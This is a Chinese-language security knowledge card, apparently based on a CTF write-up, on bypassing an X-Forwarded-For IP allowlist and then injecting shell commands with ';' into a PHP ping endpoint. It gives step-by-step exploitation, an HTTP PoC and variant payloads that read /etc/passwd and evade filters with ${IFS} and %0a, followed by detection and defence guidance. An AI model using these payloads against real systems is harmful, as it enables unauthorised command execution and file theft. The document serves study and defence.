---
id: web-php-rce-xff-spoof-ip-allowlist-command-injection
title: 命令执行接口以 X-Forwarded-For 做 IP 白名单：伪造头绕过限制后用 `;` 拼接命令读取任意文件
type: scenario
domain: web
path: web/php/rce
technique: xff-spoof-ip-allowlist-then-command-injection
aliases:
- X-Forwarded-For 伪造绕过 IP 限制
- XFF 白名单绕过
- IP 限制 + 命令拼接
- 分号命令注入
tags:
- web
- php
- command-injection
- xff
- ip-allowlist
- auth-bypass
- header-spoof
cve: []
severity: high
confidence: medium
status: verified
created: '2026-11-10'
updated: '2026-11-09'
verification:
  verified_by: verifier-T2-3W7
  verified_at: '2026-11-09T01:54:16+08:00'
  notes: 已对照原文核对；原文「第三关需要伪造 xff 为 1.1.1.1，然后命令拼接 rce」与 payload ?input=127.0.0.1;cat+/f* 一致；与既有 web-generic-auth-xforwarded-for-ip-whitelist-bypass（XFF 过登录）相比本卡多出命令拼接 sink，叠加后仍可独立复用；本次核对未读取图片，XFF 校验的具体实现（ 取值方式）属通用补充，原文只在截图中体现
---

## 一句话结论

当命令执行功能的「访问控制」是判断客户端 IP 是否为 `1.1.1.1` 这类固定值、且判断依据取自 `X-Forwarded-For` 等可伪造请求头时，先补一个伪造头通过校验，再把 `;` 拼进原本用于 `ping`/`nslookup` 类功能的参数，就能在服务端执行任意命令读取目标文件。

## 原理

- **IP 白名单基于客户端可控值**：应用在 PHP/Python 层用 `$_SERVER['HTTP_X_FORWARDED_FOR']`（或 `X-Real-IP`）判断来源而不是 `REMOTE_ADDR`。这两个头完全由客户端设置，只有在「前面有可信反代且反代会覆盖该头」时才有意义；若应用直接读它，第一次请求带上 `X-Forwarded-For: 1.1.1.1` 即通过校验。
- **命令拼接**：被放行的功能把参数拼进 shell 命令（典型 `ping -c 1 <input>`、`nslookup <input>`），没有 `escapeshellarg`/白名单校验，于是 `;`、`|`、`&&`、反引号都可注入第二条命令。
- **两道门槛都只靠一个前提**：白名单绕过只需要一个请求头；命令注入只需要一个分隔符。两者都不依赖特殊漏洞原语，因此在「内部工具页/运维面板」中很常见：开发者以为 IP 限制等于内网限制。
- 组合效果是完整链：未授权（或低权限）→ 通过伪造头进入「仅内网可用」功能 → 参数拼接 → 任意命令 → 读 flag/配置/凭据。

## 触发条件

- 存在命令执行类功能（ping/traceroute/nslookup/文件转换等），参数直接拼进 shell。
- 该功能的访问控制依据 `X-Forwarded-For`/`X-Real-IP`/`Forwarded` 等客户端头，且未在反代层强制覆盖。
- 应用与反代之间没有做「信任链」限制（例如反代未清空客户端传入的 XFF）。

## 利用步骤

1. 正常访问该功能，观察被拒提示（原文为要求来源 IP 为 `1.1.1.1` 的页面）。
2. 加请求头 `X-Forwarded-For: 1.1.1.1`（必要时同时给 `X-Real-IP`、`Forwarded: for=1.1.1.1`），确认页面放行。
3. 在参数里用 `;` 拼接任意命令：`?input=127.0.0.1;cat /f*`。
4. 从响应（或 ping 的正常回显位置）读取命令输出；需要多次读取时把命令换成 `ls`、`cat`、`id` 逐步枚举。
5. 若 `;` 被过滤，改用 `|`、`&&`、`%0a`、`$()`、反引号；若过滤空格，用 `${IFS}`、`%09`、`$IFS$9`。

## PoC

```http
GET /e744f91c29ec99f0e662c9177946c627.php?input=127.0.0.1;cat+/f* HTTP/1.1
Host: target
X-Forwarded-For: 1.1.1.1
```

```text
# 无 X-Forwarded-For 时被拒；加上后返回命令输出（原文用 cat /f* 直接读 flag）
# 变体分隔符：input=127.0.0.1|id、input=127.0.0.1%0acat${IFS}/etc/passwd
```

## 变体与关联

- **判定依据变体**：`Host: localhost`/`127.0.0.1` 访问内网面板、`X-Forwarded-Host`、`X-Original-URL`、`X-Rewrite-URL` 绕过路径级鉴权，均属「信任客户端头」的同一类问题（参见 `web/generic/auth` 下 Host 头与头部等值放行卡）。
- **命令注入利用面变体**：ping 之外的 `nslookup`、`convert`（ImageMagick）、`tar`、`ffmpeg` 等参数拼接同样适用；无回显时走 DNS/HTTP OOB。
- **前置环节**：原文该入口还需先爆破出隐藏目录、用数组传参绕过比较逻辑才能拿到接口路径，属该题特化步骤，不作为通用部分。
- 边界：反代强制覆盖 XFF（`proxy_set_header X-Forwarded-For $remote_addr`）、应用改用 `REMOTE_ADDR`、或参数做了 `escapeshellarg`/白名单校验时链路失效。

## 检测与防御

- **检测**：同一来源 IP 的请求携带多个不同 `X-Forwarded-For` 值；XFF 为内网/环回/固定公网地址但 `REMOTE_ADDR` 不同；命令类接口参数中出现 `;`、`|`、`&&`、`$(`、反引号、`${IFS}`；ping 类请求的响应里出现与 ping 无关的输出。
- **防御**：访问控制一律基于 `REMOTE_ADDR` 或经可信反代覆盖后的值；反代显式设置（而非追加）转发头，并对公网入口剥离客户端自带的 `X-Forwarded-For`；命令执行改用 `escapeshellarg`/参数数组（`proc_open` 传数组）或直接改用语言内库；对 IP 限制类功能叠加认证与审计。
